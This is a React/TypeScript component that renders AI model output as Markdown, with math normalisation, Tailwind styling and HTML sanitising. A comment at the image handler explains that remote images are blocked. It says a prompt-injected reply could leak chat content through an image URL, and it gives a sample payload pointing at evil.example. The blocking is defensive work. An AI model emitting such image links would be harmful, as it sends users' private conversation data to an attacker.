import React from 'react';
import ReactMarkdown, { Components } from 'react-markdown';
import remarkGfm from 'remark-gfm';
import rehypeRaw from 'rehype-raw';
import rehypeSanitize from 'rehype-sanitize';
import remarkMath from 'remark-math';
import rehypeKatex from 'rehype-katex';
import 'katex/dist/katex.min.css';

/* Models often write math as \[ ... \] and \( ... \). Markdown eats those
   backslashes, so convert them to $$ ... $$ and $ ... $ before parsing.
   Code blocks and inline code are left untouched. */
function normalizeMath(src: string): string {
  return src
    .split(/(```[\s\S]*?```|`[^`\n]*`)/g)
    .map((part, i) => {
      if (i % 2 === 1) return part; // code segment
      return part
        .replace(/\\\[([\s\S]+?)\\\]/g, (_, m) => `\n$$\n${m.trim()}\n$$\n`)
        .replace(/\\\(([\s\S]+?)\\\)/g, (_, m) => `$${m.trim()}$`);
    })
    .join('');
}

/* Renders model output (Markdown + GFM tables). Styled with plain Tailwind
   classes, so the typography plugin is not required. HTML such as <br> inside
   table cells is allowed but sanitized. */

const components: Components = {
  h1: ({ children }) => (
    <h1 className="text-xl font-semibold mt-5 mb-2">{children}</h1>
  ),
  h2: ({ children }) => (
    <h2 className="text-lg font-semibold mt-4 mb-2">{children}</h2>
  ),
  h3: ({ children }) => (
    <h3 className="text-base font-semibold mt-3 mb-1.5">{children}</h3>
  ),
  p: ({ children }) => <p className="my-2 leading-relaxed">{children}</p>,
  ul: ({ children }) => (
    <ul className="my-2 ml-5 list-disc space-y-1">{children}</ul>
  ),
  ol: ({ children }) => (
    <ol className="my-2 ml-5 list-decimal space-y-1">{children}</ol>
  ),
  li: ({ children }) => <li className="leading-relaxed">{children}</li>,
  strong: ({ children }) => <strong className="font-semibold">{children}</strong>,
  em: ({ children }) => <em className="italic">{children}</em>,
  a: ({ href, children }) => (
    <a
      href={href}
      target="_blank"
      rel="noreferrer noopener"
      className="underline underline-offset-2 text-blue-600 dark:text-blue-400"
    >
      {children}
    </a>
  ),
  blockquote: ({ children }) => (
    <blockquote className="my-3 border-l-2 border-zinc-300 dark:border-zinc-700 pl-4 text-zinc-600 dark:text-zinc-400">
      {children}
    </blockquote>
  ),
  hr: () => <hr className="my-4 border-zinc-200 dark:border-zinc-800" />,

  // Never load remote images. A prompt-injected reply (or a poisoned document)
  // could leak chat content through the URL, e.g. ![x](https://evil.example/?q=SECRET).
  // Only this app's own /files/<id> URLs are allowed.
  img: ({ src, alt }) => {
    const allowed = typeof src === 'string' && /^\/files\/[A-Za-z0-9]+$/.test(src);
    if (!allowed) {
      return (
        <span className="text-xs italic text-zinc-500">
          [external image blocked{alt ? `: ${alt}` : ''}]
        </span>
      );
    }
    return (
      <img src={src} alt={alt ?? ''} loading="lazy" className="max-w-full rounded-lg my-2" />
    );
  },

  // Tables scroll sideways instead of breaking the layout
  table: ({ children }) => (
    <div className="my-3 overflow-x-auto rounded-lg border border-zinc-200 dark:border-zinc-800">
      <table className="w-full text-sm border-collapse">{children}</table>
    </div>
  ),
  thead: ({ children }) => (
    <thead className="bg-zinc-100 dark:bg-zinc-900">{children}</thead>
  ),
  th: ({ children }) => (
    <th className="px-3 py-2 text-left font-semibold border-b border-zinc-200 dark:border-zinc-800">
      {children}
    </th>
  ),
  td: ({ children }) => (
    <td className="px-3 py-2 align-top border-t border-zinc-200 dark:border-zinc-800">
      {children}
    </td>
  ),

  // Code: block vs inline
  pre: ({ children }) => (
    <pre className="my-3 overflow-x-auto rounded-lg bg-zinc-100 dark:bg-zinc-900 border border-zinc-200 dark:border-zinc-800 p-3 text-xs">
      {children}
    </pre>
  ),
  code: ({ className, children }) => {
    const isBlock =
      /language-/.test(className ?? '') || String(children).includes('\n');
    if (isBlock) {
      return <code className={`font-mono ${className ?? ''}`}>{children}</code>;
    }
    return (
      <code className="font-mono text-[0.85em] px-1 py-0.5 rounded bg-zinc-100 dark:bg-zinc-800">
        {children}
      </code>
    );
  },
};

export const Markdown: React.FC<{ children: string }> = ({ children }) => (
  <ReactMarkdown
    remarkPlugins={[remarkGfm, remarkMath]}
    // KaTeX runs after sanitize so its output isn't stripped
    rehypePlugins={[
      rehypeRaw,
      rehypeSanitize,
      [rehypeKatex, { throwOnError: false, strict: 'ignore' }],
    ]}
    components={components}
  >
    {normalizeMath(children)}
  </ReactMarkdown>
);
